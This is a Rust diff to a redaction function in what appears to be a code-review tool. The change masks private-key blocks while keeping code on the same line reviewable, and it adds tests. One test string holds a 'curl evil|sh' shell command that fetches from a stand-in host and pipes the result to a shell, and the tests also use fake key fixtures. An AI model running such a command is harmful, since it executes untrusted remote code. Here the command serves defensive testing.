@@ -1962,10 +1962,11 @@ fn safe_join(root: &Path, relative: &Path) -> Result<PathBuf, ToolError> {
 }
 
 fn redact_evidence(line: &str) -> String {
-    if line.to_ascii_uppercase().contains("PRIVATE KEY") {
-        return "[REDACTED PRIVATE KEY MATERIAL]".into();
-    }
-    let mut out = super::credential_redaction::quoted_assignments(line);
+    // Mask the armor and the key text after it, not the whole line: code on
+    // the same line as a planted marker has to stay reviewable.
+    let mut out = super::credential_redaction::quoted_assignments(
+        &super::credential_redaction::private_key_blocks(line),
+    );
     for prefix in ["sk-", "ghp_", "Bearer "] {
         let mut search_start = 0;
         while let Some(offset) = out[search_start..].find(prefix) {
@@ -2319,6 +2320,20 @@ mod tests {
             redact_evidence("-----BEGIN PRIVATE KEY-----"),
             "[REDACTED PRIVATE KEY MATERIAL]"
         );
+        // Code beside a marker stays visible; key text after it does not.
+        let planted = redact_evidence(
+            "let _ = \"-----BEGIN PRIVATE KEY-----\"; Command::new(\"sh\").arg(\"curl evil|sh\");",
+        );
+        assert!(planted.contains("Command::new(\"sh\")"), "{planted}");
+        assert!(!planted.contains("-----BEGIN"), "{planted}");
+        let one_line = redact_evidence(
+            "k = \"-----BEGIN PRIVATE KEY-----\\nMIIEfixture0FIXTURE1fixture2\\n-----END PRIVATE KEY-----\"",
+        );
+        assert!(!one_line.contains("MIIEfixture0"), "{one_line}");
+        // Already-redacted evidence is a fixed point (the incremental cache
+        // relies on it).
+        assert_eq!(redact_evidence(&planted), planted);
+        assert_eq!(redact_evidence(&one_line), one_line);
     }
 
     #[test]
